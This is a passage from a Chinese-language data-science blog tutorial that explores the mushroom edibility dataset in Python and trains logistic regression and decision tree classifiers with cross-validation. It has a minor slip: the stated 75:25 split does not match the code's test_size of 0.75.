<h4 id="2-4-缺失值处查看"><a href="#2-4-缺失值处查看" class="headerlink" title="2.4 缺失值处查看"></a>2.4 缺失值处查看</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#missing values</span></span><br><span class="line">Mushroom_df.isnull().<span class="built_in">sum</span>()</span><br></pre></td></tr></table></figure>
<p>输出：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042347330.png" alt="image.png"><br>可见，该数据集并无缺失值。</p>
<h4 id="2-5-查看数据分布情况"><a href="#2-5-查看数据分布情况" class="headerlink" title="2.5 查看数据分布情况"></a>2.5 查看数据分布情况</h4><p>代码将遍历每一列并打印该列的值分布情况</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">M_cols = Mushroom_df.columns.to_list()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Value Distribution:\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> M_cols:</span><br><span class="line">    <span class="built_in">print</span>(col,<span class="string">&quot;\n&quot;</span>,Mushroom_df[col].value_counts(),<span class="string">&quot;\n\n&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>输出：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042347331.png" alt="image.png"></p>
<h4 id="2-6-数据可视化"><a href="#2-6-数据可视化" class="headerlink" title="2.6 数据可视化"></a>2.6 数据可视化</h4><h5 id="Target-Plot"><a href="#Target-Plot" class="headerlink" title="Target Plot"></a>Target Plot</h5><p><strong>Target Plot</strong>: 这是一种数据可视化技术，通常用于显示目标变量（也称为响应变量或因变量）的分布。帮助理解数据的平衡或不平衡，并可能影响选择的建模策略。</p>
<p>具体代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">total = <span class="built_in">float</span>(<span class="built_in">len</span>(Mushroom_df[M_cols[<span class="number">0</span>]]))</span><br><span class="line">plt.figure(figsize=(<span class="number">6</span>,<span class="number">6</span>))</span><br><span class="line">sns.<span class="built_in">set</span>(style=<span class="string">&quot;darkgrid&quot;</span>)</span><br><span class="line">ax = sns.countplot(Mushroom_df[M_cols[<span class="number">0</span>]])</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> ax.patches:</span><br><span class="line">    height = p.get_height()</span><br><span class="line">    ax.text(p.get_x()+p.get_width()/<span class="number">2.</span>,height + <span class="number">3</span>,<span class="string">&#x27;&#123;:1.2f&#125;&#x27;</span>.<span class="built_in">format</span>(height/total),ha=<span class="string">&quot;center&quot;</span>)</span><br><span class="line">plt.title(<span class="string">&quot;Target Plot&quot;</span>, fontsize = <span class="number">20</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p><strong>代码解析：</strong></p>
<ol>
<li><code>total = float(len(Mushroom_df[M_cols[0]]))</code>: 这行代码计算了目标变量的总实例数。</li>
<li><code>plt.figure(figsize=(6,6))</code>: 这行代码设置了图形的大小。</li>
<li><code>sns.set(style=&quot;darkgrid&quot;)</code>: 这行代码设置了 seaborn 图形的样式。</li>
<li><code>ax = sns.countplot(Mushroom_df[M_cols[0]])</code>: 这行代码创建了一个 countplot，显示了目标变量的每个类别的实例数量。</li>
<li><code>for p in ax.patches: ...</code>: 这个循环在每个条形图上方添加了一个文本，显示了该类别的实例数量占总实例数的百分比。</li>
<li><code>plt.title(&quot;Target Plot&quot;, fontsize = 20)</code>: 这行代码设置了图形的标题和字体大小。</li>
<li><code>plt.show()</code>: 这行代码显示了图形。</li>
</ol>
<p>输出：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042347332.png" alt="image.png"></p>
<h5 id="Univariate-Plots"><a href="#Univariate-Plots" class="headerlink" title="Univariate Plots"></a>Univariate Plots</h5><p> <strong>Univariate Plots</strong>: 单变量图是一种数据可视化技术，用于显示单个变量（特征）的分布。这可以包括直方图、箱线图、密度图等。这些图可以帮助理解变量的中心趋势（如平均值或中位数）、离散度（如范围或四分位数范围）、形状（如偏度或峰度）以及任何潜在的异常值。</p>
<p>具体代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> M_cols[<span class="number">1</span>:]:</span><br><span class="line">    plt.figure(figsize=(<span class="number">10</span>,<span class="number">4</span>))</span><br><span class="line">    sns.countplot(x=col , data=Mushroom_df ,palette=<span class="string">&#x27;icefire&#x27;</span>)</span><br><span class="line">    plt.title(col, fontsize=<span class="number">14</span>)</span><br><span class="line">    plt.show()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;% of total:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">round</span>((Mushroom_df[col].value_counts()/Mushroom_df.shape[<span class="number">0</span>]),<span class="number">4</span>)*<span class="number">100</span>)</span><br></pre></td></tr></table></figure>
<p><strong>代码解析：</strong></p>
<ol>
<li><code>for col in M_cols[1:]: ...</code>: 这个循环对 <code>M_cols</code> 列表中的每个元素（除了第一个元素）执行以下操作。</li>
<li><code>plt.figure(figsize=(10,4))</code>: 这行代码设置了图形的大小。</li>
<li><code>sns.countplot(x=col , data=Mushroom_df ,palette=&#39;icefire&#39;)</code>: 这行代码创建了一个 countplot，显示了给定特征的每个类别的实例数量。</li>
<li><code>plt.title(col, fontsize=14)</code>: 这行代码设置了图形的标题和字体大小。</li>
<li><code>plt.show()</code>: 这行代码显示了图形。</li>
<li><code>print(&quot;% of total:&quot;)</code>: 这行代码打印了一个字符串，表示接下来的数字是总数的百分比。</li>
<li><code>print(round((Mushroom_df[col].value_counts()/Mushroom_df.shape[0]),4)*100)</code>: 这行代码计算了每个类别的实例数量占总实例数的百分比，并打印了结果。</li>
</ol>
<p>上述代码创建了一系列的单变量图，显示每个特征的分布，并打印了每个类别的实例数量占总实例数的百分比，以下列出部分输出：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042347333.png" alt="image.png"></p>
<p><strong>单变量分析（Unvariate Analisys）：</strong></p>
<ol>
<li><strong><code>cap-shape</code></strong> - 数据集中的大多数蘑菇都有凸形（45%）或平坦（38.8%）的帽子。</li>
<li><strong><code>cap-surface</code></strong> - 最常见的帽子表面是鳞状的（39.93%），几乎没有沟槽（0.05%）。</li>
<li><strong><code>cap-color</code></strong> - 数据集中超过一半的蘑菇有棕色（28.11%）或灰色（22.65%）的帽子颜色，我们还有8种其他颜色出现的频率较低。</li>
<li><strong><code>bruises</code></strong> - 数据集中的大多数蘑菇都没有瘀伤（58.44%）。</li>
<li><strong><code>odor</code></strong> - 最常见的气味（超过70%）要么没有气味（43.43%），要么有恶臭（26.59%）。</li>
<li><strong><code>gill-attachment</code></strong> - 我们的数据中几乎所有的蘑菇都有自由的菌褶附着（约97.5%），所以这一列在我们的分析中几乎是无用的。</li>
<li><strong><code>gill-spacing</code></strong> - 我们数据集中超过85%的蘑菇有紧密的菌褶间距，所以它在我们的分析中几乎没有影响。</li>
<li><strong><code>gill-size</code></strong> - 我们数据集中的大多数蘑菇有宽的（69.08%）菌褶大小，其他的是窄的。</li>
<li><strong><code>gill-color</code></strong> - 我们数据集中超过一半的蘑菇有浅黄色（21.27%）、粉红色（18.37%）或白色（22.65%）的菌褶颜色，我们还有9种其他颜色出现的频率较低。</li>
<li><strong><code>stalk-shape</code></strong> - 我们数据集中的大多数蘑菇有锥形的（56.72%），其他的是扩大的。</li>
<li><strong><code>stalk-root</code></strong> - 最常见的柄根（超过75%）要么是球状的（46.48%）要么是丝状的（30.53%）。</li>
<li><strong><code>stalk-surface-above-ring</code></strong> - 最常见的环上柄表面（超过90%）要么是光滑的（63.71%）要么是丝状的（29.2%）。</li>
<li><strong><code>stalk-surface-below-ring</code></strong> - 最常见的环下柄表面（几乎90%）要么是光滑的（60.76%）要么是丝状的（28.36%），与<code>stalk-surface-above-ring</code>几乎没有区别。</li>
<li><strong><code>stalk-color-above-ring</code></strong> - 我们数据集中超过一半的蘑菇有白色（54.95%）的柄颜色，我们还有8种其他颜色出现的频率较低。</li>
<li><strong><code>stalk-color-below-ring</code></strong> - 我们数据集中超过一半的蘑菇有白色（53.96%）的柄颜色，我们还有8种其他颜色出现的频率较低，与<code>stalk-color-above-ring</code>几乎没有区别。</li>
<li><strong><code>veil-type</code></strong> - 所有蘑菇的面纱类型都是部分的，所以这一列在我们的分析中几乎是无用的。</li>
<li><strong><code>veil-color</code></strong> - 几乎所有的蘑菇面纱颜色都是白色（97.54%），所以这一列在我们的分析中几乎是无用的。</li>
<li><strong><code>ring-number</code></strong> - 几乎所有的蘑菇环数都是一个（92.17%），所以这一列在我们的分析中几乎是无用的。</li>
<li><strong><code>ring-type</code></strong> - 我们数据集中超过98%的蘑菇有吊坠（48.84%）、短暂的（34.17%）或大的（15.95%）环类型。</li>
<li><strong><code>spore-print-color</code></strong> - 最常见的颜色是白色（29.39%）、棕色（24.22%）、黑色（23.04%）和巧克力色（20.09%），其他颜色不重要。</li>
<li><strong><code>population</code></strong> - 最常见的种群（超过70%）要么是多个（49.73%）要么是孤立的（21.07%）。</li>
<li><strong><code>habitat</code></strong> - 最常见的栖息地（超过65%）要么是森林（38.75%）要么是草地（26.44%）。</li>
</ol>
<h5 id="Multivariate-Plots"><a href="#Multivariate-Plots" class="headerlink" title="Multivariate Plots"></a>Multivariate Plots</h5><p><strong>Multivariate Plots</strong>: 多变量图是一种数据可视化技术，用于显示两个或更多变量之间的关系。这可以包括散点图、相关矩阵、平行坐标图等。这些图可以帮助你理解变量之间的关系，例如它们是否有相关性或是否存在任何群集或异常值。</p>
<p>在本处，将对每个属性，结合目标类别（p，e）进行绘制柱状图。</p>
<p>具体代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> M_cols[<span class="number">1</span>:]: </span><br><span class="line">    plt.figure(figsize=(<span class="number">30</span>,<span class="number">20</span>))</span><br><span class="line">    plt.subplot(<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>)</span><br><span class="line">    sns.countplot(x=col ,hue=<span class="string">&#x27;class&#x27;</span>, data=Mushroom_df ,palette=<span class="string">&#x27;viridis_r&#x27;</span>)</span><br><span class="line">    plt.xlabel(col, fontsize=<span class="number">20</span>)</span><br><span class="line">    plt.legend(loc=<span class="string">&#x27;upper left&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>代码解析：</strong></p>
<ol>
<li><code>for col in M_cols[1:]: ...</code>: 这个循环对 <code>M_cols</code> 列表中的每个元素（除了第一个元素）执行以下操作。</li>
<li><code>plt.figure(figsize=(30,20))</code>: 这行代码设置了图形的大小。</li>
<li><code>plt.subplot(2,3,1)</code>: 这行代码创建了一个子图，它是一个2行3列的网格中的第一个图。</li>
<li><code>sns.countplot(x=col ,hue=&#39;class&#39;, data=Mushroom_df ,palette=&#39;viridis_r&#39;)</code>: 这行代码创建了一个 countplot，显示了给定特征的每个类别的实例数量，并使用颜色来区分目标变量的类别。</li>
<li><code>plt.xlabel(col, fontsize=20)</code>: 这行代码设置了图形的 x 轴标签和字体大小。</li>
<li><code>plt.legend(loc=&#39;upper left&#39;)</code>: 这行代码添加了一个图例，并设置了它的位置。</li>
</ol>
<p>上述代码创建了一系列的多变量条形图，显示每个特征与目标变量之间的关系，以下列出部分输出：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042347334.png" alt="image.png"></p>
<p>特征与目标变量关系的分析<br>具体代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ pd.pivot_table(Mushroom_df, index=[col,<span class="string">&quot;class&quot;</span>], aggfunc = &#123;col:np.count_nonzero&#125;) <span class="keyword">for</span> col <span class="keyword">in</span> M_cols[<span class="number">1</span>:]]</span><br></pre></td></tr></table></figure>
<p><strong>代码解析：</strong></p>
<ol>
<li><code>for col in M_cols[1:]: ...</code>: 这个循环对 <code>M_cols</code> 列表中的每个元素（除了第一个元素）执行以下操作。</li>
<li><code>pd.pivot_table(Mushroom_df, index=[col,&quot;class&quot;], aggfunc = &#123;col:np.count_nonzero&#125;)</code>: 这行代码创建了一个透视表，其中行索引是给定特征和目标变量的类别，聚合函数是非零计数。</li>
</ol>
<p>输出：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042347335.png" alt="image.png"></p>
<p><strong>特征与目标变量分析（Multivariate Analisys）：</strong></p>
<ol>
<li><strong><code>cap-shape</code></strong> - 我们数据集中的大多数<strong>瘤状</strong>蘑菇都是有毒的。</li>
<li><strong><code>cap-surface</code></strong> - 大多数<strong>纤维状</strong>帽面的蘑菇是可食用的。</li>
<li><strong><code>cap-color</code></strong> - 大多数<strong>白色</strong>帽子的蘑菇是可食用的，而大多数<strong>黄色</strong>帽子的蘑菇是有毒的。</li>
<li><strong><code>bruises</code></strong> - <strong>有瘀伤</strong>的蘑菇通常是可食用的，而<strong>无瘀伤</strong>的蘑菇通常是相反的。</li>
<li><strong><code>odor</code></strong> - <strong>无气味</strong>的蘑菇大多是可食用的，而所有<strong>恶臭</strong>的蘑菇都是有毒的。</li>
<li><strong><code>gill-attachment</code></strong> - <strong>附着</strong>的菌褶几乎总是可食用的。</li>
<li><strong><code>gill-spacing</code></strong> - <strong>密集</strong>的菌褶几乎总是可食用的。</li>
<li><strong><code>gill-size</code></strong> - <strong>窄</strong>的菌褶大小的蘑菇几乎总是有毒的。</li>
<li><strong><code>gill-color</code></strong> - <strong>浅黄色</strong>菌褶颜色的蘑菇总是有毒的。</li>
<li><strong><code>stalk-shape</code></strong> - 在有毒或可食用方面，每个值之间的差异不大。</li>
<li><strong><code>stalk-root</code></strong> - 通常，柄根数据缺失的蘑菇通常是有毒的。</li>
<li><strong><code>stalk-surface-above-ring</code></strong> - 通常，<strong>丝状</strong>的蘑菇是有毒的，<strong>光滑</strong>的通常是可食用的。</li>
<li><strong><code>stalk-surface-below-ring</code></strong> - 与<code>stalk-surface-above-ring</code>大致相同。</li>
<li><strong><code>stalk-color-above-ring</code></strong> - 通常，<strong>白色</strong>柄色的蘑菇是可食用的，粉红色的大多数是有毒的。</li>
<li><strong><code>stalk-color-below-ring</code></strong> - 与<code>stalk-color-above-ring</code>大致相同。</li>
<li><strong><code>veil-type</code></strong> - 所有蘑菇的面纱类型都是部分的，所以这一列在我们的分析中几乎是无用的。</li>
<li><strong><code>veil-color</code></strong> - 几乎所有的蘑菇面纱颜色都是**白色 (97.54%)**，所以这一列在我们的分析中几乎是无用的。</li>
<li><strong><code>ring-number</code></strong> - 几乎所有的蘑菇环数都是**一个 (92.17%)**，所以这一列在我们的分析中几乎是无用的。</li>
<li><strong><code>ring-type</code></strong> - <strong>吊坠</strong>环型的蘑菇大多是可食用的，<strong>短暂</strong>的大多是有毒的，<strong>大</strong>环型的都是有毒的。</li>
<li><strong><code>spore-print-color</code></strong> - <strong>棕色</strong>和<strong>黑色</strong>的几乎完全是可食用的，而<strong>白色</strong>和**巧克力色 (20.09%)**的大多数是有毒的。</li>
<li><strong><code>population</code></strong> - 通常，<strong>多个</strong>种群的蘑菇大多是有毒的。</li>
<li><strong><code>habitat</code></strong> - 在<strong>森林</strong>或<strong>草地</strong>生长的蘑菇大多是可食用的。</li>
</ol>
<h4 id="2-7-特征工程"><a href="#2-7-特征工程" class="headerlink" title="2.7 特征工程"></a>2.7 特征工程</h4><p>根据以上分析，不需要以下列，因此将删除它们：“鳃附着”、“茎形状”、“环下茎表面”、“圈下茎颜色”、“面纱类型”、“纱颜色”、”环编号“。<br>所以现在将创建新的特征变量X，不包括上述列：</p>
<p>具体代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Del_cols = [<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;gill-attachment&#x27;</span>, <span class="string">&#x27;stalk-shape&#x27;</span>, <span class="string">&#x27;stalk-surface-below-ring&#x27;</span>, <span class="string">&#x27;stalk-color-below-ring&#x27;</span>, <span class="string">&#x27;veil-type&#x27;</span>, <span class="string">&#x27;veil-color&#x27;</span>, <span class="string">&#x27;ring-number&#x27;</span>] </span><br><span class="line">X =Mushroom_df.copy()</span><br><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> Del_cols:</span><br><span class="line">    X = X.drop(col, axis = <span class="number">1</span>)</span><br><span class="line">X=pd.get_dummies(X,columns=X.columns,drop_first=<span class="literal">True</span>)</span><br><span class="line">X.head(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>输出：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042347336.png" alt="image.png"></p>
<p>创建目标变量y，并将其转换为相应格式（0、1）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">y = Mushroom_df[<span class="string">&#x27;class&#x27;</span>]</span><br><span class="line">Encoder_y=LabelEncoder()</span><br><span class="line">y = Encoder_y.fit_transform(y)</span><br><span class="line">y</span><br></pre></td></tr></table></figure>
<p>输出：<br><code>array([1, 0, 0, ..., 0, 1, 0])</code></p>
<h3 id="3-机器学习模型"><a href="#3-机器学习模型" class="headerlink" title="3. 机器学习模型"></a>3. 机器学习模型</h3><p><strong>前言：</strong><br>将“X”作为特征，将“y”作为“类”——想要预测的目标值。<br>这是一个分类问题，所以使用分类的方法。<br>训练集和测试集的遍历为75:25</p>
<p><strong>将使用的模型：</strong><br>逻辑回归（Logistic Regression）<br>决策树分类器（Decision Tree Classifier）<br>随机森林回归器（Random Forest Regressor）<br>XGBoost分类器（XGBoost Classifier）<br>支持向量机（Support Vector Machines）</p>
<p><strong>数据建模过程</strong>：<br>1.导入模型2.训练模型3.预测4.分类指标评估</p>
<p><strong>分类评分指标：</strong><br><em><strong>准确度：</strong></em><br>$$Accuracy&#x3D;\frac{TP+TN}{TP+TN+FP+FN}$$</p>
<p><strong>精确性：</strong><br>$$Precision&#x3D;\frac{TP}{TP+FP}$$<br><strong>召回度：</strong><br>$$Recall&#x3D;\frac{TP}{TP+FN}$$<br><strong>f1分数：</strong>-介于0和1之间的数字，即精度和查全率的调和平均值。<br>$$F_1&#x3D;2<em>\frac{precision</em>recall}{precison+recall}$$</p>
<h4 id="3-1-划分数据集"><a href="#3-1-划分数据集" class="headerlink" title="3.1 划分数据集"></a>3.1 划分数据集</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size = <span class="number">0.75</span>, random_state = <span class="number">101</span>)</span><br></pre></td></tr></table></figure>

<p>为了提高评估方法的准确性，需要使用交叉验证方法，对每个模型使用该方法，并构建一个分类报告，用于对模型的最终排名进行排名和确定。<br>具体代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cross_val</span>(<span class="params">model_name,model,X,y,cv</span>):</span><br><span class="line">    </span><br><span class="line">    scores = CVS(model, X, y, cv=cv)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;model_name&#125;</span> Scores:&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> scores:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">round</span>(i,<span class="number">2</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Average <span class="subst">&#123;model_name&#125;</span> score: <span class="subst">&#123;<span class="built_in">round</span>(scores.mean(),<span class="number">4</span>)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">index = [<span class="string">&#x27;Valid1&#x27;</span>,<span class="string">&#x27;Valid2&#x27;</span>,<span class="string">&#x27;Valid3&#x27;</span>,<span class="string">&#x27;Valid4&#x27;</span>,<span class="string">&#x27;Valid5&#x27;</span>]</span><br><span class="line">scoring = [<span class="string">&#x27;accuracy&#x27;</span>,<span class="string">&#x27;precision&#x27;</span>, <span class="string">&#x27;recall&#x27;</span>,<span class="string">&#x27;f1&#x27;</span>]</span><br></pre></td></tr></table></figure>

<h4 id="3-2-逻辑回归（Logistic-Regression）"><a href="#3-2-逻辑回归（Logistic-Regression）" class="headerlink" title="3.2 逻辑回归（Logistic Regression）"></a>3.2 逻辑回归（Logistic Regression）</h4><p>具体代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#model</span></span><br><span class="line">LR = LogisticRegression()</span><br><span class="line"><span class="comment">#cross validation</span></span><br><span class="line">LR_report = pd.DataFrame(cross_validate(LR, X, y, scoring=scoring))</span><br><span class="line"><span class="comment">#getting required score methods</span></span><br><span class="line">LR_report = LR_report.iloc[:,<span class="number">2</span>:]</span><br><span class="line"><span class="comment">#naming the columns</span></span><br><span class="line">LR_report.columns = scoring</span><br><span class="line"><span class="comment">#naming the index</span></span><br><span class="line">LR_report.index = index</span><br><span class="line"></span><br><span class="line"><span class="comment">#final result collection</span></span><br><span class="line">model_1 = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#Classification report</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Clasification report:\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(LR_report,<span class="string">&quot;\n\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Mean Scores:\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> score <span class="keyword">in</span> scoring:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\t<span class="subst">&#123;score&#125;</span>: <span class="subst">&#123;<span class="built_in">round</span>(LR_report[score].mean(),<span class="number">4</span>)&#125;</span>&quot;</span>)</span><br><span class="line">    model_1.append(<span class="built_in">round</span>(LR_report[score].mean(),<span class="number">4</span>))</span><br></pre></td></tr></table></figure>
<p><strong>代码解析：</strong></p>
<ol>
<li><code>LR = LogisticRegression()</code>: 创建一个逻辑回归模型的实例。</li>
<li><code>LR_report = pd.DataFrame(cross_validate(LR, X, y, scoring=scoring))</code>: 使用交叉验证来评估模型的性能。<code>cross_validate</code> 函数返回一个字典，其中包含每次交叉验证的结果。这个字典被转换成一个 DataFrame。</li>
<li><code>LR_report = LR_report.iloc[:,2:]</code>: 选择DataFrame 中的一部分列。</li>
<li><code>LR_report.columns = scoring</code> 和 <code>LR_report.index = index</code>: 设置了DataFrame 的列名和行名。</li>
<li><code>model_1 = []</code>: 创建一个空列表，用于收集模型的平均分数。</li>
<li>最后，打印每个评分指标的结果，并计算它们的平均值。这些平均值被添加到了 <code>model_1</code> 列表中。</li>
</ol>
<p>输出：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042347337.png" alt="image.png"></p>
<p>预测结果保存：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sample prediction for csv file</span></span><br><span class="line">LR.fit(X_train, y_train)<span class="comment">#training</span></span><br><span class="line">y_predict = LR.predict(X_test)<span class="comment">#predicting</span></span><br><span class="line">Logistic_Regression=pd.DataFrame(&#123;<span class="string">&#x27;y_test&#x27;</span>:y_test,<span class="string">&#x27;prediction&#x27;</span>:y_predict&#125;)<span class="comment">#df for camparison</span></span><br><span class="line">Logistic_Regression.to_csv(<span class="string">&quot;Logistic Regression.csv&quot;</span>)<span class="comment">#export to csv     </span></span><br></pre></td></tr></table></figure>



<h4 id="3-3-决策树分类器（Decision-Tree-Classifier）"><a href="#3-3-决策树分类器（Decision-Tree-Classifier）" class="headerlink" title="3.3 决策树分类器（Decision Tree Classifier）"></a>3.3 决策树分类器（Decision Tree Classifier）</h4><p>具体代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#model</span></span><br><span class="line">DT = DecisionTreeClassifier()</span><br><span class="line"><span class="comment">#cross validation</span></span><br><span class="line">DT_report = pd.DataFrame(cross_validate(DT, X, y, scoring=scoring))</span><br><span class="line"><span class="comment">#getting required score methods</span></span><br><span class="line">DT_report = DT_report.iloc[:,<span class="number">2</span>:]</span><br><span class="line"><span class="comment">#naming the columns</span></span><br><span class="line">DT_report.columns = scoring</span><br><span class="line"><span class="comment">#naming the index</span></span><br><span class="line">DT_report.index = index</span><br><span class="line"></span><br><span class="line"><span class="comment">#final result collection</span></span><br><span class="line">model_2 = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#Classification report</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Clasification report:\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(DT_report,<span class="string">&quot;\n\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Mean Scores:\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> score <span class="keyword">in</span> scoring:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\t<span class="subst">&#123;score&#125;</span>: <span class="subst">&#123;<span class="built_in">round</span>(DT_report[score].mean(),<span class="number">4</span>)&#125;</span>&quot;</span>)</span><br><span class="line">    model_2.append(<span class="built_in">round</span>(DT_report[score].mean(),<span class="number">4</span>))</span><br></pre></td></tr></table></figure>
<p><strong>代码解析：</strong></p>
<ol>
<li><code>DT = DecisionTreeClassifier()</code>: 创建一个决策树分类器的实例。</li>
<li><code>DT_report = pd.DataFrame(cross_validate(DT, X, y, scoring=scoring))</code>: 使用交叉验证来评估模型的性能。<code>cross_validate</code> 函数返回一个字典，其中包含了每次交叉验证的结果。这个字典被转换成一个 DataFrame。</li>
<li><code>DT_report = DT_report.iloc[:,2:]</code>: 选择 DataFrame 中的一部分列。</li>
<li><code>DT_report.columns = scoring</code> 和 <code>DT_report.index = index</code>: 设置 DataFrame 的列名和行名。</li>
<li><code>model_2 = []</code>: 创建一个空列表，用于收集模型的平均分数。</li>
<li>最后，打印每个评分指标的结果，并计算它们的平均值。这些平均值被添加到了 <code>model_2</code> 列表中。</li>
</ol>
<p>输出：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042347338.png" alt="image.png"></p>
<p>预测结果保存：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sample prediction for csv file</span></span><br><span class="line">DT.fit(X_train, y_train)<span class="comment">#training</span></span><br><span class="line">y_predict = DT.predict(X_test)<span class="comment">#predicting</span></span><br><span class="line">Decision_Tree=pd.DataFrame(&#123;<span class="string">&#x27;y_test&#x27;</span>:y_test,<span class="string">&#x27;prediction&#x27;</span>:y_predict&#125;)<span class="comment">#df for camparison</span></span><br><span class="line">Decision_Tree.to_csv(<span class="string">&quot;Decision Tree.csv&quot;</span>)<span class="comment">#export to csv     </span></span><br></pre></td></tr></table></figure>


<h4 id="3-4-随机森林回归器（Random-Forest-Regressor）"><a href="#3-4-随机森林回归器（Random-Forest-Regressor）" class="headerlink" title="3.4 随机森林回归器（Random Forest Regressor）"></a>3.4 随机森林回归器（Random Forest Regressor）</h4><p>具体代码：</p>
